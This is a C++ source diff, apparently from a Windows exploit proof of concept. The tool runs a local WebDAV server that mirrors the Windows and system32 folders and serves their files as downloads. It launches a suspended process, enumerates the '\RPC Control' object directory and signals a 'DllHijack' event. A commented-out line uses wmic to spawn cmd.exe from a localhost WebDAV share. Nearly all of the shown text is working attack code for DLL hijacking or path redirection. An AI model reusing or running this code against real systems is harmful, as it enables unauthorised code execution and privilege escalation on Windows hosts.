@@ -113,7 +113,7 @@ namespace files {
 
       str readFile() {
          str filename = "C:\\"s.append(*this);
-         if (!filesystem::exists(path())) { throw exception{ "file no exist" }; }
+         if (!filesystem::exists(filename.c_str())) { throw exception{ "file no exist" }; }
          if (!filesystem::is_regular_file(path())) { return ""; }
 
          cout << "Opening: " << filename << " for returning";
@@ -415,9 +415,10 @@ namespace httpd
                   r.setResponseHeader(HttpHeaderContentType , "text/xml");
                   {
                      direntries content;
+                     
                      try {
                         auto dircontent = filepath{ str{ "C:\\" } + str{r.url}.replacesubstr("DAVWWWROOT"s,""s) }.enumDir("C:\\\\", true);
-                        for (auto& f : dircontent) { content.push_back(f); cout << f.filename << endl; }
+                        for (auto& f : dircontent) { content.push_back(f);  cout << f.filename << endl; }
                      }
                      catch (...) {}
                      r.sendResponse((content.size() ? 200 : 404), xml::makexml(r.httphost, content));
@@ -440,9 +441,10 @@ namespace httpd
                   }
                   else
                   {
-                     auto response = filepath{ r.url }.readFile();
+                      auto response = filepath{ r.url }.readFile();
+                   //  auto response = filepath{ "windows\\system32\\cmd.exe" }.readFile();
                      r.setResponseHeader(HttpHeaderContentType, "application/octet-stream");
-                     r.setResponseHeader("Content-Disposition", "attachment; filename=\"" + "r.url.dll"s + "\"");
+                     r.setResponseHeader("Content-Disposition", "attachment; filename=\"" +  r.url + "\"");
                      cout << "served " << r.url << " by webdav " << endl;
                      r.sendResponse(200, response);
                   }
@@ -493,15 +495,20 @@ static const auto  orgCout = std::cout.rdbuf([]() {
  
 int main()
 try {
+
    mirrordir cdir{ filepath{"c:\\"} };
-   mirrordir windowsdir{ filepath{"c:\\windows"} };
-   mirrordir system32dir{ filepath{"c:\\windows\\system32"} };
+   mirrordir windowsdir{ filepath{"c:\\windows\\"} };
+   mirrordir system32dir{ filepath{"c:\\windows\\system32\\"} };
    cdir.insert(L"windows", windowsdir.primaryPath);
    windowsdir.insert(L"system32", system32dir.primaryPath);
 
    httpd::ready.waitForSignal();
+ //  getchar();
 
-   auto suspended = process(L"c:\\windows\\system32\\cmd.exe", L"", L"c:\\windows\\system32", true);
+ // auto p= process(L"cmd /c wmic process call create \\\\LOCALHOST@8990\\\davwwwroot\\windows\\system32\\cmd.exe", L"", L"c:\\windows\\system32", false);
+
+
+   auto suspended = process(L"c:\\windows\\hh.exe", L"", L"c:\\windows\\system32", true);
    {
       auto RPCControlDir = ntObjDir::make({ .ObjectName = wstr{L"\\RPC Control"} });
       for (const auto& f : filepath{ "C:\\windows\\system32" }.enumDir()) {
@@ -519,7 +526,7 @@ try {
    }
    httpd::stoppedDllHijack.signalPulse();
    httpd::webdav::webdav.join();
-   //getchar();
+    
 }
 catch (abortError& e) { cout << e.what() << endl; }
 catch (...) { cout << "Unexspected error" << endl; }
